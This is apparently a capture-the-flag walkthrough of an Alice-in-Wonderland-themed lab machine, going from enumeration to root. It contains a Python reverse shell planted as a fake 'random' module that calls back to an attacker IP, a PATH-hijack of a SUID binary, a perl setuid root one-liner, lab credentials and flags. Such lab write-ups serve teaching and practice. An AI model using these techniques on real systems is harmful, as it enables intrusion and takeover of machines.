
We start by enumerating the machine with a classic nmap scan:

	nmap  10.10.43.29

output:

	ports	service
	22		ssh
	80		http

we visit the site and we start a dir enum in the background:

	gobuster dir -u http://10.10.43.29/ -w /usr/share/worldist/dirbuster/dir-list-medium ...

output:

	/img
	/r

there are also some images to downloads but they are just rabbit holes to distract u
the /r seems kinda odd so we keep digging the rubbit hole (as the machine is theamed) so we keep enum the directory so we find:

	/a
	/b
	...
we identify a pattern so i shoot my shot and i try searching for

	http://10.10.43.29/r/a/b/b/i/t/

at the end we find an html file with a user and a password in the source code:

	alice:HowDothTheLittleCrocodileImproveHisShiningTail

we can try those creds in ssh:

	ssh 10.10.43.29
	password:HowDothTheLittleCrocodileImproveHisShiningTail  

we find a root.txt in alice /home directory but off course we cant "cat" it so we need to keep digging:
i tried to see alice permissions with:

	sudo -l

output:

	(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 

this means that we can run the script in alice's /home dir; in the script its imported the random library; maybe we can try to fake the library with one of our script so the user rabbit can execute our rev shell:

	random.py

	import sys
	import socket
	import os
	import pty

	def choice(d):
			s=socket.socket();s.connect(("10.8.79.118",int(5555)));
			[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
			pty.spawn("/bin/bash")
			return "ciao"

with this script we get a call back to our nc listener:

	nc -lvnp 5555

so now we got the rabbit shell.
inside rabbit's home directory we find a teaParty, its an ELF 32 bits exe with suid bit on, we analyze the ELF on ghidra and we se this:

	setuid(0x3eb);
	setgid(0x3eb);
	puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
	system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
	puts("Ask very nicely, and I will give you some tea while you wait for him");
	getchar();
	puts("Segmentation fault (core dumped)");
	return;

the script print the date dinamically by calling the "date" binary, so we can change the $PATH env variable so we can create our own date file to execute as hatter, the next user:

	export PATH=/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

now we create the date file and mark it as executable:

	echo "/bin/bash" > date
	chmod +x date

now we can run the script and get a shell with hatter:

	./teaParty

Now we are hatter and we can try launch linpeas.sh to enumerate hatter privilage:
we find perl suid so we can execute perl rev shell

	perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

now we are root and we can cat the root.txt that is in the root folder (funny joke for the rabbit hole reverse)

	cd /home/alice
	cat root.txt
	thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}

and then we go to /root directory and we cat the user.txt:
	
	cd /root
	cat user.txt
	thm{"Curiouser and curiouser!"}

and The machine is done!!
